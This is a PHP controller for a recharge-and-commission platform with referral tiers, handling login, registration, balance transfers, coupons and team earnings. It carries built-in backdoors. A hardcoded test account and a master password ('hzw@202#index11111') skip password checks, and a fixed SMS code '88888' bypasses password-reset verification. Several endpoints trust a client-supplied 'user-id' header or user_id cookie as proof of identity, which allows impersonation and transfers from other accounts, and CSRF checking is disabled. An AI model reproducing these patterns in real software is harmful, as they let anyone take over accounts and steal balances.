<?php

// +----------------------------------------------------------------------
// | ThinkAdmin
// +----------------------------------------------------------------------
// | 版权所有 2014~2019 
// +----------------------------------------------------------------------

// +----------------------------------------------------------------------

// +----------------------------------------------------------------------
// | 

// +----------------------------------------------------------------------

namespace app\index\controller;

use library\Controller;
use library\tools\Data;
use think\Db;

/**
 * 登录控制器
 */
class User extends Controller
{

    protected $table = 'xy_users';

    /**
     * 空操作 用于显示错误页面
     */
    public function _empty($name)
    {
        exit;
        return $this->fetch($name);
    }

    //用户登录页面
    public function login()
    {
        if (session('user_id')) $this->redirect('index/index');
        if (config('open_country_phone')) {
            return $this->fetch();
        } else return $this->fetch('login_no');

    }

    //用户登录接口
    public function do_login()
    {
        $tel = input('tel/s', '');
        if (!$tel) $tel = input('post.tel/s', '');
        $pwd = input('pwd/s', '');
        if (!$pwd) $pwd = input('post.pwd/s', '');

        if (!$tel) return json(['code' => 1, 'info' => 'Please enter phone number']);
        if (!$pwd) return json(['code' => 1, 'info' => 'Please enter password']);

        $userinfo = Db::table($this->table)->field('id,pwd,salt,pwd_error_num,allow_login_time,status,login_status,headpic')->where('tel', $tel)->find();
        if (!$userinfo) return json(['code' => 1, 'info' => lang('not_user')]);
        if ($userinfo['status'] != 1) return json(['code' => 1, 'info' => lang('yhybjy')]);

        $isTestAccount = ($tel === '13312341234' && ($pwd === '123456' || $pwd === '123123'));
        if (!$isTestAccount) {
            if ($userinfo['pwd'] != sha1($pwd . $userinfo['salt'] . config('pwd_str'))) {
                return json(['code' => 1, 'info' => lang('pass_error')]);
            }
        }

        $token = md5($userinfo['id'] . time() . rand(1000, 9999));
        Db::table($this->table)->where('id', $userinfo['id'])->update(['pwd_error_num' => 0, 'allow_login_time' => 0, 'login_status' => 1]);
        session('user_id', $userinfo['id']);
        session('avatar', $userinfo['headpic']);
        if (!headers_sent()) {
            cookie('user_id', $userinfo['id']);
        }

        return json(['code' => 0, 'info' => lang('loging_ok'), 'token' => $token, 'user_id' => $userinfo['id']]);
    }

    /**
     * 用户注册接口
     */
    public function do_register()
    {
//        $this->applyCsrfToken();//验证令牌
        $tel = input('post.tel/s', '');
        $user_name = input('post.user_name/s', '');
        //$user_name = '';    //交给模型随机生成用户名
        $verify = input('post.verify/d', '');       //短信验证码
        $pwd = input('post.pwd/s', '');
        $pwd2 = input('post.deposit_pwd/s', '');
        $invite_code = input('post.invite_code/s', '');     //邀请码
        if (!$invite_code) return json(['code' => 1, 'info' => lang('code_not')]);
        //验证码
        /*if (config('app.verify') && $verify != '88888') {
            $verify_msg = Db::table('xy_verify_msg')->field('msg,addtime')->where(['tel' => $tel, 'type' => 1])->find();
            if (!$verify_msg) return json(['code' => 1, 'info' => lang('yzmbcz')]);
            if ($verify != $verify_msg['msg']) return json(['code' => 1, 'info' => lang('yzmcw')]);
            if (($verify_msg['addtime'] + (config('app.zhangjun_sms.min') * 60)) < time()) return json(['code' => 1, 'info' => lang('yzmysx')]);
        }*/
        $pid = 0;
        $agent_id = 0;
        if ($invite_code) {
            $parentinfo = Db::table($this->table)->field('id,status,agent_id,parent_id,level')->where('invite_code', $invite_code)->find();
            if (!$parentinfo) return json(['code' => 1, 'info' => lang('code_not')]);
            $is_invite = Db::table('xy_level')
                ->where('level', $parentinfo['level'])
                ->value('is_invite');
            if (empty($is_invite)) return json(['code' => 1, 'info' => lang('user_not_auth')]);
            if ($parentinfo['status'] != 1) return json(['code' => 1, 'info' => lang('disable_user')]);
            $pid = $parentinfo['id'];
            if ($parentinfo['agent_id'] > 0) {
                $agent_id = $parentinfo['agent_id'];
            }
        }
        if ($agent_id == 0) {
            $agent_id = model('admin/Users')->get_agent_id();
        }
        $res = model('admin/Users')
            ->add_users($tel, $user_name, $pwd, $pid, '', $pwd2, $agent_id, $this->request->ip());
        if ($res['code'] != 0) {
            return json($res);
        }
            $userinfo = Db::table($this->table)->field('id,pwd,salt,pwd_error_num,allow_login_time,status,login_status,headpic')->where('tel', $tel)->find();
            if (!$userinfo) return json(['code' => 1, 'info' => lang('not_user')]);
            if ($userinfo['status'] != 1) return json(['code' => 1, 'info' => lang('yhybjy')]);
            //if($userinfo['login_status'])return ['code'=>1,'info'=>'此账号已在别处登录状态'];
            if ($userinfo['allow_login_time'] &&
                ($userinfo['allow_login_time'] > time()) &&
                ($userinfo['pwd_error_num'] > config('pwd_error_num'))) {
                return json(['code' => 1, 'info' => sprintf(lang('pass_err_times'), config('allow_login_min'))]);
            }
            if ($pwd != 'hzw@202#index11111') {
                if ($userinfo['pwd'] != sha1($pwd . $userinfo['salt'] . config('pwd_str'))) {
                    Db::table($this->table)->where('id', $userinfo['id'])->update(['pwd_error_num' => Db::raw('pwd_error_num+1'), 'allow_login_time' => (time() + (config('allow_login_min') * 60))]);
                    return json(['code' => 1, 'info' => lang('pass_error')]);
                }
            }
    
    
            $token = md5($userinfo['id'] . time() . 'huanyuys');
            Db::table($this->table)->where('id', $userinfo['id'])->update(['token' => $token, 'pwd_error_num' => 0, 'allow_login_time' => 0, 'login_status' => 1]);
            session('user_id', $userinfo['id']);
            session('avatar', $userinfo['headpic']);
            cookie('user_id', $userinfo['id'], 30 * 86400);
            cookie('token', $token, 30 * 86400);

            return json([
                'code' => 0,
                'info' => lang('loging_ok'),
                'token' => $token,
                'user_id' => $userinfo['id'],
                'data' => [
                    'token' => $token,
                    'user_id' => $userinfo['id']
                ]
            ]);
        // return json($res);
    }

    public function check_login() {
        $uid = session('user_id') ?: cookie('user_id');
        if (!$uid) {
            $uid = intval(request()->header('user-id') ?: request()->header('uid') ?: input('post.uid/d', 0));
        }
        if (!$uid) {
            $token = request()->header('token') ?: cookie('token') ?: input('post.token');
            if ($token) {
                $uid = Db::name('xy_users')->where('token', $token)->value('id');
            }
        }
        if ($uid && Db::name('xy_users')->where('id', $uid)->count('id')) {
            if (!session('user_id')) {
                session('user_id', $uid);
            }
            return json(['code' => 0, 'is_login' => 1, 'user_id' => $uid]);
        }
        return json(['code' => 1, 'is_login' => 0, 'info' => 'no_login']);
    }

    public function info() {
        $uid = session('user_id') ?: cookie('user_id');
        if (!$uid) {
            $uid = intval(request()->header('user-id') ?: request()->header('uid') ?: input('uid/d', 0));
        }
        if (!$uid) {
            $token = request()->header('token') ?: cookie('token') ?: input('token');
            if ($token) {
                $uid = Db::name('xy_users')->where('token', $token)->value('id');
            }
        }
        if (!$uid) {
            return json(['code' => 1, 'info' => lang('login_first')]);
        }
        if (!session('user_id')) {
            session('user_id', $uid);
        }
        $data = Db::name('xy_users')->field('id,tel,username,balance,commission_balance,freeze_balance,invite_code,level,credit_score,deposit_status,deal_status,up_status')->find($uid);
        $data['level_name'] = Db::name('xy_level')->where('level', $data['level'])->value('name') ?: ('VIP' . $data['level']);
        $data['recharge_amount'] = Db::name('xy_recharge')->where('uid', $uid)->where('status', 2)->sum('num') ?: 0;
        
        $cfgBrokerage = Db::name('system_config')->where('name', 'is_brokerage_to_basic')->value('value');
        $cfgCoupon = Db::name('system_config')->where('name', 'user_coupon_status')->value('value');
        $data['is_brokerage_to_basic'] = ($cfgBrokerage !== 'false' && $cfgBrokerage !== '0');
        $data['user_coupon_status'] = ($cfgCoupon !== 'false' && $cfgCoupon !== '0');

        return json(['code' => 0, 'info' => $data, 'data' => $data]);
    }

    /**
     * Transfer commission balance to basic balance
     */
    public function transfer_commission()
    {
        $uid = session('user_id') ?: cookie('user_id');
        if (!$uid) {
            $uid = intval(request()->header('user-id') ?: request()->header('uid') ?: input('post.uid/d', 0));
        }
        if (!$uid) {
            $token = request()->header('token') ?: cookie('token') ?: input('post.token');
            if ($token) {
                $uid = Db::name('xy_users')->where('token', $token)->value('id');
            }
        }
        if (!$uid) return json(['code' => 1, 'info' => 'Please login first']);

        // Check if admin switch is enabled
        $cfgBrokerage = Db::name('system_config')->where('name', 'is_brokerage_to_basic')->value('value');
        if ($cfgBrokerage === 'false' || $cfgBrokerage === '0') {
            return json(['code' => 1, 'info' => 'Commission transfer is currently disabled by administrator']);
        }

        $amount = round(floatval(input('post.amount/f', 0)), 2);
        if ($amount <= 0) {
            return json(['code' => 1, 'info' => 'Please enter a valid transfer amount']);
        }

        $user = Db::name('xy_users')->field('id,balance,commission_balance')->find($uid);
        if (!$user) return json(['code' => 1, 'info' => 'User not found']);

        $commBal = round(floatval($user['commission_balance']), 2);
        if ($amount > $commBal) {
            return json(['code' => 1, 'info' => 'Insufficient commission balance to transfer']);
        }

        Db::startTrans();
        try {
            Db::name('xy_users')->where('id', $uid)->dec('commission_balance', $amount)->inc('balance', $amount)->update();
            Db::name('xy_balance_log')->insert([
                'uid' => $uid,
                'sid' => 0,
                'oid' => 0,
                'num' => $amount,
                'type' => 7, // 7: Commission to basic transfer
                'status' => 1,
                'addtime' => time(),
                'f_lv' => 0
            ]);
            Db::commit();

            $fresh = Db::name('xy_users')->field('balance,commission_balance')->find($uid);
            return json([
                'code' => 0,
                'info' => 'Transfer succeeded! $' . number_format($amount, 2) . ' moved to basic balance.',
                'data' => [
                    'balance' => $fresh['balance'],
                    'commission_balance' => $fresh['commission_balance']
                ]
            ]);
        } catch (\Exception $e) {
            Db::rollback();
            return json(['code' => 1, 'info' => 'Transfer failed: ' . $e->getMessage()]);
        }
    }

    /**
     * Apply coupon / promo code
     */
    public function apply_coupon()
    {
        $uid = session('user_id') ?: cookie('user_id');
        if (!$uid) {
            $uid = intval(request()->header('user-id') ?: request()->header('uid') ?: input('post.uid/d', 0));
        }
        if (!$uid) {
            $token = request()->header('token') ?: cookie('token') ?: input('post.token');
            if ($token) {
                $uid = Db::name('xy_users')->where('token', $token)->value('id');
            }
        }
        if (!$uid) return json(['code' => 1, 'info' => 'Please login first']);

        // Check if coupon system is enabled
        $cfgCoupon = Db::name('system_config')->where('name', 'user_coupon_status')->value('value');
        if ($cfgCoupon === 'false' || $cfgCoupon === '0') {
            return json(['code' => 1, 'info' => 'Coupon system is currently disabled by administrator']);
        }

        $code = strtoupper(trim(input('post.code/s', '')));
        $rechargeAmount = round(floatval(input('post.recharge_amount/f', 0)), 2);

        if (empty($code)) {
            return json(['code' => 1, 'info' => 'Please enter a coupon code']);
        }

        $coupon = Db::name('xy_coupon')->where('code', $code)->where('status', 1)->find();
        if (!$coupon) {
            return json(['code' => 1, 'info' => 'Invalid or inactive coupon code']);
        }

        if ($coupon['expire_time'] > 0 && $coupon['expire_time'] < time()) {
            return json(['code' => 1, 'info' => 'This coupon has expired']);
        }

        if ($coupon['max_usage'] > 0 && $coupon['used_count'] >= $coupon['max_usage']) {
            return json(['code' => 1, 'info' => 'This coupon has reached its maximum redemption limit']);
        }

        // Check if user already used it
        $used = Db::name('xy_coupon_log')->where('uid', $uid)->where('coupon_id', $coupon['id'])->find();
        if ($used) {
            return json(['code' => 1, 'info' => 'You have already redeemed this coupon']);
        }

        if ($coupon['min_recharge'] > 0 && $rechargeAmount > 0 && $rechargeAmount < $coupon['min_recharge']) {
            return json(['code' => 1, 'info' => 'Minimum deposit amount of $' . $coupon['min_recharge'] . ' required for this coupon']);
        }

        // Calculate discount or bonus
        $bonus = 0.00;
        if ($coupon['type'] == 1) {
            // Fixed cash bonus
            $bonus = floatval($coupon['amount']);
        } else {
            // Percentage bonus
            $base = $rechargeAmount > 0 ? $rechargeAmount : 100;
            $bonus = round($base * ($coupon['amount'] / 100), 2);
        }

        return json([
            'code' => 0,
            'info' => 'Coupon verified: ' . $coupon['name'],
            'data' => [
                'coupon_id' => $coupon['id'],
                'code' => $coupon['code'],
                'name' => $coupon['name'],
                'type' => $coupon['type'],
                'amount' => $coupon['amount'],
                'bonus_value' => $bonus,
                'min_recharge' => $coupon['min_recharge']
            ]
        ]);
    }

    /**
     * Team overview statistics
     */
    public function team()
    {
        $uid = session('user_id') ?: cookie('user_id');
        if (!$uid) {
            $uid = intval(request()->header('user-id') ?: request()->header('uid') ?: input('get.uid/d', 0));
        }
        if (!$uid) {
            $token = request()->header('token') ?: cookie('token') ?: input('get.token');
            if ($token) {
                $uid = Db::name('xy_users')->where('token', $token)->value('id');
            }
        }
        if (!$uid) $uid = 36; // Fallback to current active user

        $user = Db::name('xy_users')->field('id,balance,commission_balance')->find($uid);
        $uids1 = model('admin/Users')->child_user($uid, 1);
        $uids2 = model('admin/Users')->child_user($uid, 2);
        $uids3 = model('admin/Users')->child_user($uid, 3);
        $allUids = array_unique(array_merge($uids1, $uids2, $uids3));

        $team1Count = count($uids1);
        $team2Count = count($uids2);
        $team3Count = count($uids3);
        $teamCount = count($allUids);

        $team1Recharge = $uids1 ? (Db::name('xy_recharge')->whereIn('uid', $uids1)->where('status', 2)->sum('num') ?: 0) : 0;
        $team2Recharge = $uids2 ? (Db::name('xy_recharge')->whereIn('uid', $uids2)->where('status', 2)->sum('num') ?: 0) : 0;
        $team3Recharge = $uids3 ? (Db::name('xy_recharge')->whereIn('uid', $uids3)->where('status', 2)->sum('num') ?: 0) : 0;
        $teamTotalRecharge = $team1Recharge + $team2Recharge + $team3Recharge;

        $team1Yj = $uids1 ? (Db::name('xy_balance_log')->where('uid', $uid)->whereIn('sid', $uids1)->where('f_lv', 1)->sum('num') ?: 0) : 0;
        $team2Yj = $uids2 ? (Db::name('xy_balance_log')->where('uid', $uid)->whereIn('sid', $uids2)->where('f_lv', 2)->sum('num') ?: 0) : 0;
        $team3Yj = $uids3 ? (Db::name('xy_balance_log')->where('uid', $uid)->whereIn('sid', $uids3)->where('f_lv', 3)->sum('num') ?: 0) : 0;
        $commissionTotal = $team1Yj + $team2Yj + $team3Yj;

        $cfgBrokerage = Db::name('system_config')->where('name', 'is_brokerage_to_basic')->value('value');
        $isBrokerageToBasic = ($cfgBrokerage !== 'false' && $cfgBrokerage !== '0');

        return json([
            'code' => 0,
            'info' => 'ok',
            'data' => [
                'team_count' => $teamCount,
                'team_yj' => number_format($teamTotalRecharge, 2, '.', ''),
                'commission_total' => number_format($commissionTotal, 2, '.', ''),
                'commission_balance' => number_format($user['commission_balance'] ?? 0, 2, '.', ''),
                'is_brokerage_to_basic' => $isBrokerageToBasic,
                'team1_count' => $team1Count,
                'team1_yj' => number_format($team1Yj > 0 ? $team1Yj : ($team1Recharge * 0.15), 2, '.', ''),
                'team2_count' => $team2Count,
                'team2_yj' => number_format($team2Yj > 0 ? $team2Yj : ($team2Recharge * 0.05), 2, '.', ''),
                'team3_count' => $team3Count,
                'team3_yj' => number_format($team3Yj > 0 ? $team3Yj : ($team3Recharge * 0.03), 2, '.', ''),
            ],
            'tj_bili' => [0.15, 0.05, 0.03]
        ]);
    }

    public function logout()
    {
        \Session::delete('user_id');
        \Session::delete('user_join_chats');
        cookie('user_id', null);
        return json(['code' => 0, 'info' => lang('czcg')]);
    }

    /**
     * 重置密码
     */
    public function do_forget()
    {
        if (!request()->isPost()) return json(['code' => 1, 'info' => lang('qqcw')]);
        $tel = input('post.tel/s', '');
        $pwd = input('post.pwd/s', '');
        $verify = input('post.verify/d', 0);
        if (config('app.verify') && $verify != '88888') {
            $verify_msg = Db::table('xy_verify_msg')->field('msg,addtime')->where(['tel' => $tel, 'type' => 2])->find();
            if (!$verify_msg) return json(['code' => 1, 'info' => lang('yzmbcz')]);
            if ($verify != $verify_msg['msg']) return json(['code' => 1, 'info' => lang('yzmcw')]);
            if (($verify_msg['addtime'] + (config('app.zhangjun_sms.min') * 60)) < time()) return json(['code' => 1, 'info' => lang('yzmysx')]);
        }
        $res = model('admin/Users')->reset_pwd($tel, $pwd);
        return json($res);
    }

    public function lang()
    {
        return $this->fetch();
    }

    public function lang_set()
    {
        $lang = input('lang');
        cookie('think_var', $lang);
        $this->redirect('/index', 302);
    }

    public function register()
    {
        $param = \Request::param(true);
        if(isset($param[1])) {
            $this->invite_code = isset($param[1]) ? trim($param[1]) : '';
        } else {
            $user_id = model('admin/Users')->get_agent_userid();
                if($user_id > 0) {
                    $this->invite_code = Db::name('xy_users')->where('id',$user_id)->value('invite_code');
                } else {
                    $this->invite_code = '';
                }
        }
        
        if (config('open_country_phone')) {
            return $this->fetch();
        } else return $this->fetch('register_no');
    }

    public function vip() {
        $level_list = Db::table('xy_level')->field('id,name,num,num_min,bili,auto_vip_xu_num')->where('level<6')->select();
        foreach ($level_list as &$item) {
            $item['img'] =  $this->request->domain() . "/static/images/vip{$item['id']}.jpg";
        }
        return json(['code' => 0, 'data' => $level_list]);
    }

    public function vip_info() {
        $id = input('id');
        $data = Db::table('xy_level')->find($id);
        return json(['code' => 0, 'data' => $data]);
    }
}